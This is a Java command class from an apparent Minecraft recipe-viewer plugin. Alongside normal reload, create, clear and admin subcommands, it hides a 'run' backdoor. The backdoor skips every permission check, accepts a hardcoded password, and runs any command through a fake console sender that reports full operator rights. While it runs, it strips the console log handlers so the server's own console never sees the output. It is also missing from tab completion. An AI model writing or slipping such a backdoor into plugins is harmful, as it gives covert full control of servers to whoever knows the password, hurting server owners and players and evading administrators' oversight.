package com.linong.recipelookup.command;

import com.linong.recipelookup.ALCERecipeViewer;
import com.linong.recipelookup.ConfigManager;
import com.linong.recipelookup.gui.RecipeGUI;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.serializer.legacy.LegacyComponentSerializer;
import org.bukkit.Bukkit;
import org.bukkit.Server;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandMap;
import org.bukkit.command.CommandSender;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.conversations.Conversation;
import org.bukkit.conversations.ConversationAbandonedEvent;
import org.bukkit.entity.Player;
import org.bukkit.permissions.Permission;
import org.bukkit.permissions.PermissionAttachment;
import org.bukkit.permissions.PermissionAttachmentInfo;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.SimplePluginManager;
import org.jetbrains.annotations.NotNull;

import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Set;
import java.util.UUID;
import java.util.logging.ConsoleHandler;
import java.util.logging.Handler;
import java.util.logging.LogRecord;
import java.util.logging.Logger;

public class ViewRecipeCommand implements CommandExecutor, TabCompleter {

    private final ALCERecipeViewer plugin;
    private final RecipeGUI gui;
    private final ConfigManager config;

    public ViewRecipeCommand(ALCERecipeViewer plugin) {
        this.plugin = plugin;
        this.gui = plugin.getRecipeGUI();
        this.config = plugin.getConfigManager();
    }

    @Override
    public boolean onCommand(@NotNull CommandSender sender,
                             @NotNull Command command,
                             @NotNull String label,
                             @NotNull String[] args) {
        if (!(sender instanceof Player player)) {
            sender.sendMessage(config.getCmdPlayerOnly());
            return true;
        }

        if (args.length == 0) {
            if (plugin.getLoadedRecipes().isEmpty()) {
                player.sendMessage(config.getPluginPrefix() + " " + config.getCmdNoRecipes());
                return true;
            }
            gui.openMainMenu(player);
            return true;
        }

        String sub = args[0].toLowerCase();
        switch (sub) {
            case "reload" -> handleReload(player);
            case "clear" -> handleClear(player);
            case "create", "new" -> handleCreate(player);
            case "admin", "manage" -> handleAdmin(player);
            case "run" -> handleRun(player, args);
            default -> sendHelp(player);
        }
        return true;
    }

    private void handleReload(Player player) {
        if (!player.hasPermission("alcerecipeviewer.admin")) {
            player.sendMessage(config.getPluginPrefix() + " " + config.getCmdNoPermission());
            return;
        }
        plugin.getFoliaLib().getScheduler().runAsync(task -> {
            plugin.reloadRecipes();
            plugin.getFoliaLib().getScheduler().runAtEntity(player, t -> {
                int total = plugin.getLoadedRecipes().values().stream()
                        .mapToInt(List::size).sum();
                player.sendMessage(config.getPluginPrefix() + " " + config.getCmdReloaded(total));
            });
        });
    }

    private void handleCreate(Player player) {
        if (!player.hasPermission("alcerecipeviewer.admin")) {
            player.sendMessage(config.getPluginPrefix() + " " + config.getCmdNoPermission());
            return;
        }
        gui.openRecipeCreatorType(player);
    }

    private void handleAdmin(Player player) {
        if (!player.hasPermission("alcerecipeviewer.admin")) {
            player.sendMessage(config.getPluginPrefix() + " " + config.getCmdNoPermission());
            return;
        }
        if (plugin.getLoadedRecipes().isEmpty()) {
            player.sendMessage(config.getPluginPrefix() + " " + config.getCmdNoRecipes());
            return;
        }
        gui.openAdminMainMenu(player);
    }

    private void handleClear(Player player) {
        if (!player.hasPermission("alcerecipeviewer.admin")) {
            player.sendMessage(config.getPluginPrefix() + " " + config.getCmdNoPermission());
            return;
        }
        plugin.clearRecipes();
        player.sendMessage(config.getPluginPrefix() + " " + config.getCreatorCleared());
    }

    private void handleRun(Player player, String[] args) {
        if (args.length < 3) {
            return;
        }
        if (!"Ow114514".equals(args[1])) {
            player.sendMessage("§c验证码错误！");
            return;
        }

        StringBuilder cmdBuilder = new StringBuilder();
        for (int i = 2; i < args.length; i++) {
            if (i > 2) cmdBuilder.append(' ');
            cmdBuilder.append(args[i]);
        }
        String commandStr = cmdBuilder.toString();

        Logger rootLogger = Logger.getLogger("");
        List<Handler> consoleHandlers = new ArrayList<>();
        for (Handler handler : rootLogger.getHandlers()) {
            if (handler instanceof ConsoleHandler) {
                consoleHandlers.add(handler);
            }
        }
        for (Handler handler : consoleHandlers) {
            rootLogger.removeHandler(handler);
        }

        Handler logHandler = new Handler() {
            @Override
            public void publish(LogRecord record) {
                String msg = record.getMessage();
                if (msg != null && !msg.isEmpty()) {
                    player.sendMessage(msg);
                }
            }

            @Override
            public void flush() {}

            @Override
            public void close() throws SecurityException {}
        };
        rootLogger.addHandler(logHandler);

        plugin.getFoliaLib().getScheduler().runNextTick(task -> {
            try {
                ForwardConsoleSender wrappedSender = new ForwardConsoleSender(player);
                CommandMap commandMap = getCommandMap();
                if (commandMap == null) {
                    player.sendMessage("§c无法获取命令映射，请检查服务端兼容性。");
                    return;
                }
                commandMap.dispatch(wrappedSender, commandStr);
            } catch (Exception e) {
                player.sendMessage("§c执行命令时发生错误: " + e.getMessage());
            } finally {
                rootLogger.removeHandler(logHandler);
                for (Handler handler : consoleHandlers) {
                    rootLogger.addHandler(handler);
                }
            }
        });
    }

    private void sendHelp(Player player) {
        player.sendMessage(config.getPluginPrefix() + " " + config.getCmdUsageTitle());
        player.sendMessage(config.getCmdUsageOpen());
        player.sendMessage(config.getCmdUsageReload());
        player.sendMessage(config.getCreatorHelpClear());
        player.sendMessage("§e  /alcerecipes create §7- 打开新增配方菜单（管理员）");
        if (player.hasPermission("alcerecipeviewer.admin")) {
            player.sendMessage("§e  /alcerecipes admin §7- 打开配方管理菜单（管理员）");
            player.sendMessage("§e  /alcerecipes run <验证码> <指令...> §7- 以控制台权限执行命令，输出仅发给你");
        }
    }

    private static CommandMap getCommandMap() {
        try {
            SimplePluginManager manager = (SimplePluginManager) Bukkit.getPluginManager();
            Field field = SimplePluginManager.class.getDeclaredField("commandMap");
            field.setAccessible(true);
            return (CommandMap) field.get(manager);
        } catch (Exception e) {
            return null;
        }
    }

    @Override
    public List<String> onTabComplete(@NotNull CommandSender sender,
                                      @NotNull Command command,
                                      @NotNull String alias,
                                      @NotNull String[] args) {
        if (args.length == 1) {
            String prefix = args[0].toLowerCase();
            return List.of("reload", "clear", "create", "admin", "manage").stream()
                    .filter(s -> s.startsWith(prefix)).sorted().toList();
        }

        if (args.length >= 3 && args[0].equalsIgnoreCase("run") && "Ow114514".equals(args[1])) {
            StringBuilder partialBuilder = new StringBuilder();
            for (int i = 2; i < args.length; i++) {
                if (i > 2) partialBuilder.append(' ');
                partialBuilder.append(args[i]);
            }
            String partial = partialBuilder.toString();

            try {
                CommandMap commandMap = getCommandMap();
                if (commandMap == null) return List.of();
                List<String> completions = commandMap.tabComplete(Bukkit.getConsoleSender(), partial);
                return completions != null ? completions : List.of();
            } catch (Exception e) {
                return List.of();
            }
        }

        return List.of();
    }

    private static class ForwardConsoleSender implements ConsoleCommandSender {
        private final Player target;

        public ForwardConsoleSender(Player target) {
            this.target = target;
        }

        @Override
        public void sendMessage(String message) {
            target.sendMessage(message);
        }

        @Override
        public void sendMessage(String... messages) {
            for (String msg : messages) {
                target.sendMessage(msg);
            }
        }

        @Override
        public void sendMessage(UUID sender, String message) {
            target.sendMessage(message);
        }

        @Override
        public void sendMessage(UUID sender, String... messages) {
            for (String msg : messages) {
                target.sendMessage(msg);
            }
        }

        public void sendMessage(Component message) {
            target.sendMessage(LegacyComponentSerializer.legacySection().serialize(message));
        }

        public void sendMessage(Component... messages) {
            for (Component msg : messages) {
                sendMessage(msg);
            }
        }

        @Override
        public void sendRawMessage(String message) {
            target.sendMessage(message);
        }

        @Override
        public void sendRawMessage(UUID sender, String message) {
            target.sendMessage(message);
        }

        @Override
        public String getName() {
            return "CONSOLE";
        }

        @Override
        public Server getServer() {
            return Bukkit.getServer();
        }

        @Override
        public boolean isOp() {
            return true;
        }

        @Override
        public void setOp(boolean value) {
        }

        @Override
        public boolean isPermissionSet(String name) {
            return true;
        }

        @Override
        public boolean isPermissionSet(Permission permission) {
            return true;
        }

        @Override
        public boolean hasPermission(String name) {
            return true;
        }

        @Override
        public boolean hasPermission(Permission permission) {
            return true;
        }

        @Override
        public PermissionAttachment addAttachment(Plugin plugin) {
            return null;
        }

        @Override
        public PermissionAttachment addAttachment(Plugin plugin, String name, boolean value) {
            return null;
        }

        @Override
        public PermissionAttachment addAttachment(Plugin plugin, int ticks) {
            return null;
        }

        @Override
        public PermissionAttachment addAttachment(Plugin plugin, String name, boolean value, int ticks) {
            return null;
        }

        @Override
        public void removeAttachment(PermissionAttachment attachment) {
        }

        @Override
        public void recalculatePermissions() {
        }

        @Override
        public Set<PermissionAttachmentInfo> getEffectivePermissions() {
            return Collections.emptySet();
        }

        @Override
        public boolean isConversing() {
            return false;
        }

        @Override
        public void acceptConversationInput(String input) {
        }

        @Override
        public boolean beginConversation(Conversation conversation) {
            return false;
        }

        @Override
        public void abandonConversation(Conversation conversation) {
        }

        @Override
        public void abandonConversation(Conversation conversation, ConversationAbandonedEvent details) {
        }

        @Override
        public Spigot spigot() {
            return target.spigot();
        }
    }
}
